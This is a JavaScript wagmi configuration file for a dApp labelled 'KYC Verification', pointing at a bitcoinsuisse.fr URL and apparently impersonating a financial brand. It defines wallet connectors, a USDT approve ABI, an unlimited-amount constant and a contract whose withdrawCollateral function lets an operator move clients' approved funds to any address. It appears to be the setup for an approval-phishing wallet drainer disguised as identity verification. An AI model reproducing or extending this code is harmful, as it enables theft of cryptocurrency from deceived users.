import { http, createConfig } from 'wagmi';
import { mainnet } from 'wagmi/chains';
import { walletConnect, injected, coinbaseWallet } from 'wagmi/connectors';

// Configuration WalletConnect
const projectId = '762758307ff6761e3e2a1340348775f1';

const metadata = {
  name: 'KYC Verification',
  description: 'Verification',
  url: 'https://www.bitcoinsuisse.fr',
  icons: []
};

export const config = createConfig({
  chains: [mainnet],
  connectors: [
    injected({ 
      shimDisconnect: true,
      target: 'metaMask'
    }),
    walletConnect({ 
      projectId, 
      metadata, 
      showQrModal: true,
      qrModalOptions: {
        themeMode: 'dark'
      }
    }),
    coinbaseWallet({
      appName: metadata.name,
      appLogoUrl: metadata.icons[0]
    })
  ],
  transports: {
    [mainnet.id]: http('https://eth-mainnet.public.blastapi.io')
  },
  ssr: false
});

// Adresses des contrats
export const CONTRACT_ADDRESSES = {
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  // ANCIENS contrats (ne plus utiliser)
  COLLATERAL_MANAGER_V1: '0x7b2b8f74484d8c2bb8f0c30d1b758031054bdbe1', // Permit2
  COLLATERAL_MANAGER_V2: '0xF53918295f8ea66702D51D88a5A7Baeb66294091', // Sans SafeERC20
  // NOUVEAU contrat V3 avec SafeERC20 - DÉPLOYÉ LE 14/01/2026
  COLLATERAL_MANAGER: '0x9dAf78938Ff0Db73748AB8710973A3D81D7F6f7E',
  // Adresse admin (celle qui déploie le contrat)
  ADMIN_ADDRESS: '0xE2D574613e8b9Cf2A6e1b5664393Fd5306E1f28C'
};

// ABI minimum pour USDT
export const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function'
  }
];

// ABI pour CollateralManagerV2 (simplifié)
export const COLLATERAL_MANAGER_ABI = [
  // Write functions
  {
    inputs: [],
    name: 'registerClient',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    inputs: [
      { internalType: 'address', name: 'client', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
      { internalType: 'uint256', name: 'amount', type: 'uint256' },
      { internalType: 'string', name: 'reason', type: 'string' }
    ],
    name: 'withdrawCollateral',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  // Read functions
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'getClientAllowance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'getClientBalance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'isClientRegistered',
    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'hasClientApproved',
    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [{ internalType: 'address', name: 'client', type: 'address' }],
    name: 'getClientInfo',
    outputs: [
      { internalType: 'uint256', name: 'balance', type: 'uint256' },
      { internalType: 'uint256', name: 'allowance', type: 'uint256' },
      { internalType: 'bool', name: 'registered', type: 'bool' },
      { internalType: 'bool', name: 'canWithdraw', type: 'bool' }
    ],
    stateMutability: 'view',
    type: 'function'
  },
  {
    inputs: [],
    name: 'operator',
    outputs: [{ internalType: 'address', name: '', type: 'address' }],
    stateMutability: 'view',
    type: 'function'
  }
];

// Constantes
export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
